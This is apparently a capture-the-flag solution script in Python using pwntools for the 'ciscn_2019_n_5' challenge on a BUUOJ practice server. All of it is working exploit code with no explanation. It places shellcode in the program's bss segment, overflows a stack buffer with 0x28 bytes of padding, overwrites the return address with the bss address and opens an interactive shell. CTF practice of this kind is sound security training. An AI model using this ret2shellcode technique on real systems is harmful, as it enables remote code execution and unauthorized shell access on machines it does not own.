#coding:utf-8
from pwn import *
import pwnlib
from LibcSearcher import *
context.arch = 'amd64'
# sh = process("./ciscn_2019_n_5")
sh = remote("node3.buuoj.cn",26109)
# elf = ELF("./ciscn_2019_n_5")
bss_addr = 0x0601080
shellcode = asm(shellcraft.sh())
payload = 'a' *0x28 + p64(bss_addr)
sh.sendlineafter("name\n",shellcode)
sh.sendlineafter("me?\n",payload)
sh.interactive()    